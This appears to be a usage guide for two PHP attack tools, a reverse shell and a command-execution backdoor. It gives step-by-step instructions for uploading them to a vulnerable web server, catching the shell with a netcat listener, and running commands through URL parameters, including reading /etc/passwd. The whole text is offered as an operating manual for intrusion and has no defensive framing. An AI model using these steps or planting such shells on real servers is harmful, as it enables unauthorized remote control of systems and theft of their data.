# php-reverse-shell.php - Guide
This is interractive php reverse shell. It creates sh reverse shell.
## Usage:
- First Change ip address and port to your ip address and port.
```
$ip_address  = '127.0.0.1'; 	
$port_number = 8080;
```
- Upload php-reverse-shell.php to remote server (generally with the vulnerability you discovered).
- In your system install netcat if not already installed and run this command in the terminal:
```
nc -lnvp 8080
```
- Here 8080 is the open port in your system it should be same as $port_number in php-reverse-shell.php
- Trigger the remote shell script.
```
https://vulnerable-web.site/php-reverse-shell.php
```
- You will successfully get a reverse shell on your terminal.

# basic-half-blind-backdoor.php - Guide
This is hald-blind non-interractive php backdoor. YOu can run commands on remote server but you will not get reverse shell.
## Usage:
- First upload the basic-half-blind-backdoor.php to remote server.
- Trigger the script using web browser or curl:
```
curl https://vulnerable-web.site/basic-half-blind-backdoor.php?cmd=<linux command here>
```
For example:
```
curl https://vulnerable-web.site/basic-half-blind-backdoor.php?cmd=ls
```
OR you can directly type the url with command on your web browser:
```
https://vulnerable-web.site/basic-half-blind-backdoor.php?cmd=cat%20/etc/passwd
```
## Enjoy !!!!